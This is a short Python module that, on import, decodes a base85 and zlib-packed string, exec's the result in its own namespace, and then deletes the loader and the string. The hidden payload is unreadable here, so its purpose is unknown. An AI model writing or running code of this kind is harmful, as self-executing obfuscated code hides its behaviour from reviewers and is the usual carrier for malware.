
# Obfuscated module
import base64
import zlib
import types

__obfuscated_code = "c$}40+iu%95PjEI4Ack9g)O0dG|&aoB)d&7iII5GhoTTzX=JmJNR_1Obq)Xf4kb#KluKPd*wpyU?aUc5Q?dZFE4f$$FG{HlT=2xq;7sg1XHfW~LTz;WoXho^@SbN6sNhX&3D;;o*0#W3N^Rub#Rq@tc}dQ+hO_0>dCpOog$MNUeg7@fXw8t+cGz;WfkYOC6p&RSF<c6kbF(9C?NfiHm_ZzK!A%?o8uM%h-zZRAseA$2s2Q-zY+@ttQPhTMlh7r-B1cY9e<7GnKYa)44rgkukG}SEOjOtY@9jsBSsmxIROwP7^~r@cOe8pP?3Z*#XUfMDW*das+OM!X+vdVHCDGg-Lq%QjGMGe@=@7g@mZH*x-4D|HHm6klSDn&dKxWD33G9!B9sJqQ=UfUyb<S7263NA9WtqF8qwku+bnwGyI;4XbMOsQOj2ltO%%+(J%>S~#gQ2{wc%A~IspmPgo|fKIhSG$#gX}!52?7k)A^6d@oZE7vOwUVFC93G>t0>tpAu!kebP%h1xJ6SbG0OD!ljZftrfOHBct056VQ;HCjFnuldyL(RIj#z%VWm#YZ94b(^5y-O5d}4kc2&RBW?I*;14chlSYV>2#YJ!S3zd=zsQWaxOMC*qZ8`5&tEGE@;GfIY43;-{^o=G7hb$gzelV2*u5E^JY08^*2QpLz=}tpNg|;uB&>j9@TDPc6DQHdK-`!k8$_#tLnQ@IH-!3iwmtbit)8TDnyKF5BxN3I4<u_wI*N;lVsNFDr(|4%RkO)|nn_%L0cQPBS@^n;|Yw67cVuEHe&U?6m?P1!}&!cfeWx0rn_?TW|rqaO}S4+Et+r8>R8nR9z510lVa?)HUVJ*-g^ZUxR%pyr}Pht;ndKhhOUA5=Efb-_^=&Me9m)94|o2%>9UH4j?wA(*fz~uS&!(`?>Bwc<Q)iWL~!g&;!ayEc(%joCpsIfbcK(m$V{+U8Lg!9ncAl-hMd?Yl<$<R{kQS`X8FCb^dx0HeVhc1FA(rTH|Eje$qM|*cVJV>IG4W?C&&-8GFjC`mO&DR@qif`0m$3aMyYIjP61~?mNpij<kv~X<QJHY>fU&)d"

def __load():
    code = zlib.decompress(base64.b85decode(__obfuscated_code))
    module_code = compile(code, __file__, 'exec')
    module_globals = globals()
    exec(module_code, module_globals)

__load()
del __load
del __obfuscated_code
